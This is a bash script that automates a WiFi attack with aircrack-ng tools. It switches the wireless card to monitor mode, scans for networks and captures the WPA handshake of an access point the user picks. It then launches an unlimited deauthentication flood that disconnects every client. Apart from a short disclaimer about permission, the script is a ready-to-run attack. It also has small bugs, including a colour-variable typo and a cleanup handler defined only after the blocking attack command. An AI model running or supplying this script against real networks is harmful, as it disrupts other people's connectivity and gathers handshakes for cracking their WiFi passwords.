#!/bin/bash

# Define colors for comments
Yellow='\033[0;33m'
Red='\033[0;31m'
NC='\033[0m' 

# Run the script as root
if [ "$EUID" -ne 0 ]; then
  echo -e "${Yellow}Please run this script as root.${NC}"
  exit
fi

# Check if aircrack-ng is installed
if ! command -v aircrack-ng &> /dev/null; then
  echo -e "${Yellow}aircrack-ng is not installed.${NC}"
  read -p "Type 'install' to install aircrack-ng or press Enter to skip: " choice
  if [[ "$choice" == "install" ]]; then
    apt install aircrack-ng -y
  else
    echo -e "${Yellow}Skipping installation. Please ensure aircrack-ng is installed before running this script.${NC}"
    exit 1
  fi
else
  echo -e "${Yellow}aircrack-ng is already installed.${NC}"
fi

# Detect the wireless interface
echo -e "${Yellow}Detecting wireless interfaces...${NC}"
interface=$(iw dev | awk '$1=="Interface"{print $2}')
if [ -z "$interface" ]; then
  echo -e "${Yellow}No wireless interface found. Exiting.${NC}"
  exit 1
fi
echo -e "${Yellow}Wireless interface detected: $interface${NC}"

# Enable monitor mode using ip commands
echo -e "${Yellow}Enabling monitor mode on $interface...${NC}"
sudo ip link set "$interface" down
sudo iw "$interface" set type monitor
sudo ip link set "$interface" up
mon_interface="$interface"
echo -e "${Yellow}Monitor mode enabled on $mon_interface.${NC}"

# Start airodump-ng
echo -e "${Yellow}Starting airodump-ng on $mon_interface. Press Ctrl+C when ready to proceed.${NC}"
airodump-ng "$mon_interface"

# Prompt user for CH and BSSID
read -p $'\033[0;31mEnter the channel (CH): \033[0m' ch
read -p $'\033[0;31mEnter the BSSID: \033[0m' bssid


# Open a new terminal to run the airodump-ng command
echo -e "${Yellow}Opening a new terminal for capturing handshake...${NC}"
gnome-terminal -- bash -c "airodump-ng $mon_interface -c $ch --bssid $bssid -w handshake_file; exec bash"

# Notify the user
echo -e "${Yellow}Handshake capturing started in the new terminal. Continue monitoring there.${NC}"

# Warning and confirmation before deauthentication
echo -e "${Ref}WARNING: Only perform attacks on your own WiFi network or with explicit permission.${NC}"
echo -e "${Red}Do not attack or use this tool on public WiFi networks.${NC}"
echo -e "${Red}We are not responsible for any results or consequences.${NC}"
echo -e "${Red}This next command may disrupt or damage the WiFi network. Proceed at your own risk.${NC}"
echo -e "${Red}Press Enter to continue or Ctrl+C to exit.${NC}"
read -r

# Deauthenticate clients with safe exit on Ctrl+C
trap 'cleanup_and_exit' SIGINT

echo -e "${Yellow}Starting deauthentication attack. Press Ctrl+C to stop and clean up.${NC}"
aireplay-ng --deauth 0 -a "$bssid" "$mon_interface"

# Cleanup function to disable monitor mode and restart services
cleanup_and_exit() {
  echo -e "${Yellow}Cleaning up: Disabling monitor mode and restarting NetworkManager...${NC}"
  sudo ip link set "$mon_interface" down
  sudo iw "$mon_interface" set type managed
  sudo ip link set "$mon_interface" up
  sudo service NetworkManager start
  echo -e "${Yellow}Monitor mode disabled and NetworkManager restarted.${NC}"
  exit 0
}

# Wait indefinitely to allow the trap to handle Ctrl+C
while true; do :; done
